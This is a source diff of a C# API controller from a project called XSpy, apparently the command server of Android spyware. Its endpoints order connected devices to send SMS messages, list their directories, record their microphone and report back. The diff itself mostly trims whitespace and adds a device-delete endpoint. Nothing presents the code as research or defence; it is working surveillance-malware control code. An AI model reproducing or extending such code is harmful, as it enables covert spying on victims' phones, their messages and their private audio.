@@ -32,7 +32,7 @@ namespace XSpy.Controllers.Api
             var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
             if (device == null)
                 return NotFound();
-            
+
             var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
             if (string.IsNullOrEmpty(connId))
                 return BadRequest();
@@ -40,12 +40,12 @@ namespace XSpy.Controllers.Api
             var client = _hubContext.Clients.Client(connId);
             if (client == null)
                 return BadRequest();
-            
+
             await client.SendAsync("0xSM", "sendSMS", request.Number, request.Message);
-            
+
             return Ok(request);
         }
-        
+
 
         [HttpGet("{deviceId}/isLoading"), PreExecution]
         public async Task<IActionResult> IsDirLoaded(Guid deviceId)
@@ -56,7 +56,7 @@ namespace XSpy.Controllers.Api
 
             return Ok(device.IsLoadingDir);
         }
-        
+
         [HttpGet("{deviceId}/dirs"), PreExecution]
         public async Task<IActionResult> GetLoadedDirs(Guid deviceId)
         {
@@ -66,7 +66,7 @@ namespace XSpy.Controllers.Api
 
             return Ok(device);
         }
-        
+
         [HttpPost("{deviceId}/dir"), PreExecution]
         public async Task<IActionResult> LoadDir([FromRoute] Guid deviceId, LoadPathRequest pathRequest)
         {
@@ -90,7 +90,7 @@ namespace XSpy.Controllers.Api
 
             return Ok(pathRequest);
         }
-        
+
         [HttpPost("{deviceId}/rec"), PreExecution]
         public async Task<IActionResult> Record([FromRoute] Guid deviceId, MicRecordRequest recordRequest)
         {
@@ -114,7 +114,7 @@ namespace XSpy.Controllers.Api
 
             return Ok(recordRequest);
         }
-        
+
 
         [HttpGet("{deviceId}/update"), PreExecution]
         public async Task<IActionResult> RequestUpdate(Guid deviceId)
@@ -148,6 +148,21 @@ namespace XSpy.Controllers.Api
             await client.SendAsync("0xLO");
 
             return Ok(deviceId);
+        }
+
+
+        [HttpGet("{id}/delete"), PreExecution]
+        public async Task<IActionResult> Delete([FromRoute] Guid id)
+        {
+            var device = await _deviceService.GetDeviceById(id, LoggedUser.Id);
+            if (device == null)
+            {
+                return NotFound();
+            }
+
+            await _deviceService.Delete(device);
+
+            return Ok(new {message = "Ok"});
         }
 
         [Route("list"), PreExecution]
